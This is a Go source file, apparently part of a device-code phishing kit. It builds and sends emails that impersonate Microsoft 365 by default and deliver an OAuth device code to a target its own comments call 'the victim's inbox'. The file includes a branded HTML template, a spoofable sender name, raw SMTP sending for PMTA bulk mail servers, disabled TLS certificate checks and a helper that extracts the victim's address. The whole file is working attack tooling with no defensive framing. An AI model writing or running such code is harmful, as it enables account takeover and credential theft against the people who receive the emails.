package core

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net"
	"net/smtp"
	"strings"
	"time"
)

// SendDeviceCodeEmail sends a device code to the victim's inbox
func SendDeviceCodeEmail(cfg *MailerConfig, toEmail, userCode string) error {
	if cfg == nil || cfg.SMTPHost == "" {
		return fmt.Errorf("SMTP not configured")
	}

	msg := buildDeviceCodeEmail(cfg.FromName, cfg.FromEmail, toEmail, userCode, cfg.BrandName, cfg.EmailSubject, cfg.EmailBody, cfg.LogoURL)
	addr := fmt.Sprintf("%s:%d", cfg.SMTPHost, cfg.SMTPPort)

	// Plain PMTA: use raw net.Conn to avoid Go textproto dot-stuffing
	if cfg.SMTPTLS == "plain" || cfg.SMTPPort == 25 || cfg.SMTPPort == 2525 {
		return sendPlainSMTP(addr, cfg, toEmail, msg)
	}

	var c *smtp.Client
	var err error

	if cfg.SMTPPort == 465 || cfg.SMTPTLS == "ssl" {
		tlsConfig := &tls.Config{ServerName: cfg.SMTPHost, InsecureSkipVerify: true}
		conn, tlsErr := tls.Dial("tcp", addr, tlsConfig)
		if tlsErr != nil {
			return fmt.Errorf("TLS dial failed: %v", tlsErr)
		}
		c, err = smtp.NewClient(conn, cfg.SMTPHost)
	} else {
		c, err = smtp.Dial(addr)
	}
	if err != nil {
		return fmt.Errorf("SMTP dial failed: %v", err)
	}
	defer c.Close()

	if cfg.SMTPTLS == "starttls" {
		if ok, _ := c.Extension("STARTTLS"); ok {
			tlsConfig := &tls.Config{ServerName: cfg.SMTPHost, InsecureSkipVerify: true}
			if err = c.StartTLS(tlsConfig); err != nil {
				return fmt.Errorf("STARTTLS failed: %v", err)
			}
		}
	}

	if cfg.SMTPUsername != "" {
		auth := smtp.PlainAuth("", cfg.SMTPUsername, cfg.SMTPPassword, cfg.SMTPHost)
		if err = c.Auth(auth); err != nil {
			return fmt.Errorf("SMTP auth failed: %v", err)
		}
	}

	if err = c.Mail(cfg.FromEmail); err != nil {
		return fmt.Errorf("MAIL FROM failed: %v", err)
	}
	if err = c.Rcpt(toEmail); err != nil {
		return fmt.Errorf("RCPT TO failed: %v", err)
	}
	w, err := c.Data()
	if err != nil {
		return fmt.Errorf("DATA failed: %v", err)
	}
	_, err = w.Write([]byte(msg))
	if err != nil {
		return fmt.Errorf("write failed: %v", err)
	}
	return w.Close()
}

// sendPlainSMTP sends via raw TCP for PMTA servers (bypasses Go textproto dot-stuffing)
func sendPlainSMTP(addr string, cfg *MailerConfig, toEmail, msg string) error {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("dial failed: %v", err)
	}
	defer conn.Close()

	readln := func() (int, string, error) {
		buf := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			return 0, "", err
		}
		resp := strings.TrimSpace(string(buf[:n]))
		code := 0
		fmt.Sscanf(resp, "%d", &code)
		return code, resp, nil
	}
	write := func(s string) error {
		conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
		_, err := fmt.Fprintf(conn, "%s\r\n", s)
		return err
	}

	code, _, err := readln()
	if err != nil || code != 220 {
		return fmt.Errorf("SMTP banner: code=%d err=%v", code, err)
	}

	if err := write("EHLO " + cfg.SMTPHost); err != nil {
		return err
	}
	code, _, _ = readln()

	if cfg.SMTPUsername != "" {
		if err := write("AUTH LOGIN"); err != nil {
			return err
		}
		code, _, _ = readln()
		if code != 334 {
			return fmt.Errorf("AUTH LOGIN rejected: %d", code)
		}
		if err := write(base64.StdEncoding.EncodeToString([]byte(cfg.SMTPUsername))); err != nil {
			return err
		}
		code, _, _ = readln()
		if code != 334 {
			return fmt.Errorf("AUTH user rejected: %d", code)
		}
		if err := write(base64.StdEncoding.EncodeToString([]byte(cfg.SMTPPassword))); err != nil {
			return err
		}
		code, _, _ = readln()
		if code != 235 {
			return fmt.Errorf("AUTH pass rejected: %d", code)
		}
	}

	if err := write("MAIL FROM:<" + cfg.FromEmail + ">"); err != nil {
		return err
	}
	code, _, _ = readln()
	if code != 250 {
		return fmt.Errorf("MAIL FROM: %d", code)
	}

	if err := write("RCPT TO:<" + toEmail + ">"); err != nil {
		return err
	}
	code, _, _ = readln()
	if code != 250 {
		return fmt.Errorf("RCPT TO: %d", code)
	}

	if err := write("DATA"); err != nil {
		return err
	}
	code, _, _ = readln()
	if code != 354 {
		return fmt.Errorf("DATA: %d", code)
	}

	lines := strings.Split(msg, "\r\n")
	for i, line := range lines {
		if strings.HasPrefix(line, ".") {
			lines[i] = "." + line
		}
	}
	if err := write(strings.Join(lines, "\r\n")); err != nil {
		return fmt.Errorf("body write: %v", err)
	}
	if err := write("."); err != nil {
		return fmt.Errorf("terminator write: %v", err)
	}
	code, _, _ = readln()
	if code != 250 {
		return fmt.Errorf("body rejected: %d", code)
	}

	write("QUIT")
	return nil
}

func buildDeviceCodeEmail(fromName, fromEmail, toEmail, code, brand, subject, customBody, logoURL string) string {
	if brand == "" {
		brand = "Microsoft 365"
	}
	if fromName == "" {
		fromName = brand
	}
	if subject == "" {
		subject = fmt.Sprintf("Your %s verification code: %s", brand, code)
	}
	subject = strings.ReplaceAll(subject, "{code}", code)
	subject = strings.ReplaceAll(subject, "{brand}", brand)

	logoTag := ""
	if logoURL != "" {
		logoTag = `<img src="` + logoURL + `" alt="` + brand + `" style="display:block;border:0;width:auto;height:auto" />`
	}

	var buf bytes.Buffer
	buf.WriteString("From: " + fromName + " <" + fromEmail + ">\r\n")
	buf.WriteString("To: " + toEmail + "\r\n")
	buf.WriteString("Subject: " + subject + "\r\n")
	buf.WriteString("Date: " + time.Now().UTC().Format("Mon, 02 Jan 2006 15:04:05 -0700") + "\r\n")
	buf.WriteString("MIME-Version: 1.0\r\n")
	buf.WriteString("Content-Type: text/html; charset=UTF-8\r\n")
	buf.WriteString("\r\n")

	if customBody != "" {
		body := strings.ReplaceAll(customBody, "{code}", code)
		body = strings.ReplaceAll(body, "{brand}", brand)
		body = strings.ReplaceAll(body, "{logo}", logoTag)
		buf.WriteString(body)
	} else {
		buf.WriteString(`<!DOCTYPE html><html><body style="font-family:'Segoe UI',sans-serif;padding:30px;background:#f5f5f5">`)
		buf.WriteString(`<div style="max-width:560px;margin:0 auto;background:#fff;border:1px solid #e0e0e0;border-radius:4px">`)
		if logoURL != "" {
			buf.WriteString(`<div style="padding:24px 30px;background:#0078d4;border-radius:4px 4px 0 0">` + logoTag + `</div>`)
		} else {
			buf.WriteString(`<div style="padding:24px 30px;background:#0078d4;border-radius:4px 4px 0 0"><strong style="color:#fff;font-size:18px">` + brand + `</strong></div>`)
		}
		buf.WriteString(`<div style="padding:30px">`)
		buf.WriteString(`<p style="color:#333;font-size:15px">Your verification code:</p>`)
		buf.WriteString(`<div style="background:#f0f0f0;padding:16px 20px;border-left:4px solid #0078d4;margin:16px 0">`)
		buf.WriteString(`<strong style="font-size:22px;font-family:monospace;letter-spacing:4px;color:#0078d4">` + code + `</strong>`)
		buf.WriteString(`</div>`)
		buf.WriteString(`<p style="color:#888;font-size:12px;margin-top:24px">If you did not request this code, please ignore this email.</p>`)
		buf.WriteString(`</div></div></body></html>`)
	}
	return buf.String()
}

func getVictimEmail(params map[string]string) string {
	if email, ok := params["email"]; ok && strings.Contains(email, "@") {
		return email
	}
	return ""
}
